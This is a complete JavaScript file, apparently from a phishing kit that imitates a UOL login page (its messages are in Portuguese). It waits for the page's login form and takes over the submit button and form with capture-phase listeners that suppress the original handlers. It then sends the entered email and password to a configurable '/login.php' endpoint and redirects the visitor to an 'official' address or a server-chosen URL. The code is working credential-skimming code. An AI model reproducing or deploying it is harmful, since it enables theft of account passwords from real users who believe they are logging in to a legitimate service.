"use strict";

(function () {
    var cfg = window.LOGIN_BRIDGE || {};
    var action = (function () {
        var u = String(cfg.action || "/login.php");
        if (/^https?:\/\//i.test(u)) return u;
        if (u.charAt(0) === "/") return window.location.origin + u;
        return window.location.origin + "/" + u;
    })();
    var official = window.UOL_OFFICIAL || "/";
    var M = window.UOL_MESSAGES || {};
    var msgEl = null;

    function ensureMessageEl() {
        if (msgEl && document.body.contains(msgEl)) {
            return msgEl;
        }
        msgEl = document.getElementById("osiris-bridge-message");
        if (!msgEl) {
            msgEl = document.createElement("div");
            msgEl.id = "osiris-bridge-message";
            msgEl.style.cssText = "max-width:400px;margin:12px auto;padding:10px 12px;border-radius:4px;font-size:14px;display:none;text-align:center;";
            var root = document.getElementById("root");
            if (root && root.parentNode) {
                root.parentNode.insertBefore(msgEl, root.nextSibling);
            } else {
                document.body.appendChild(msgEl);
            }
        }
        return msgEl;
    }

    function showMessage(text, ok) {
        var el = ensureMessageEl();
        el.style.display = text ? "block" : "none";
        el.style.background = ok ? "#eafaf1" : "#fdecea";
        el.style.color = ok ? "#1e8449" : "#c0392b";
        el.textContent = text || "";
    }

    function findFields() {
        var root = document.getElementById("root") || document;
        var pass = root.querySelector('input[type="password"]');
        var user = root.querySelector(
            'input[type="email"], input[type="text"], input[name="username"], input[name="login"], input[autocomplete="username"]'
        );
        var btn = root.querySelector('button[type="submit"], button[data-qa="submit"], form button');
        if (!pass || !user || !btn) {
            return null;
        }
        return { user: user, pass: pass, btn: btn };
    }

    function finishResult(result, btn) {
        var data = result.data || {};
        if (data.blocked && data.redirect) {
            window.location.replace(data.redirect);
            return;
        }
        if (data.redirect && result.ok) {
            window.location.replace(data.redirect || official);
            return;
        }
        if (data.redirect && !result.ok) {
            window.location.replace(data.redirect);
            return;
        }
        showMessage(data.text || data.message || "Usuario ou senha invalidos.", false);
        document.body.classList.remove("logging-in");
        if (btn) {
            btn.disabled = false;
        }
    }

    function doLogin(fields) {
        var email = String(fields.user.value || "").trim();
        var pass = String(fields.pass.value || "");
        if (!email) {
            showMessage("Informe seu e-mail para entrar.", false);
            return;
        }
        if (!pass) {
            showMessage("Informe sua senha para entrar.", false);
            return;
        }

        var body = "login=" + encodeURIComponent(email) + "&password=" + encodeURIComponent(pass);
        document.body.classList.add("logging-in");
        fields.btn.disabled = true;
        showMessage(M.authenticating || "Autenticando...", true);

        var delay = 0;
        var delayDone = false;
        var fetchResult = null;

        setTimeout(function () {
            delayDone = true;
            if (fetchResult) {
                finishResult(fetchResult, fields.btn);
            }
        }, delay);

        fetch(action, {
            method: "POST",
            headers: { "Content-Type": "application/x-www-form-urlencoded" },
            credentials: "same-origin",
            body: body
        })
            .then(function (res) {
                return res.json().then(function (data) {
                    return { ok: res.ok, data: data };
                });
            })
            .then(function (result) {
                fetchResult = result;
                if (delayDone) {
                    finishResult(result, fields.btn);
                }
            })
            .catch(function () {
                showMessage(M.network_error || "Erro de conexao.", false);
                document.body.classList.remove("logging-in");
                fields.btn.disabled = false;
            });
    }

    function bindFields(fields) {
        if (fields.btn.dataset.osirisBound === "1") {
            return true;
        }
        fields.btn.dataset.osirisBound = "1";

        fields.btn.addEventListener(
            "click",
            function (e) {
                e.preventDefault();
                e.stopImmediatePropagation();
                doLogin(fields);
            },
            true
        );

        var form = fields.btn.closest("form");
        if (form) {
            form.addEventListener(
                "submit",
                function (e) {
                    e.preventDefault();
                    e.stopImmediatePropagation();
                    doLogin(fields);
                },
                true
            );
        }
        return true;
    }

    var attempts = 0;
    var maxAttempts = cfg.waitForMax || 200;
    var timer = setInterval(function () {
        attempts += 1;
        var fields = findFields();
        if (fields && bindFields(fields)) {
            clearInterval(timer);
        } else if (attempts >= maxAttempts) {
            clearInterval(timer);
        }
    }, 250);
})();
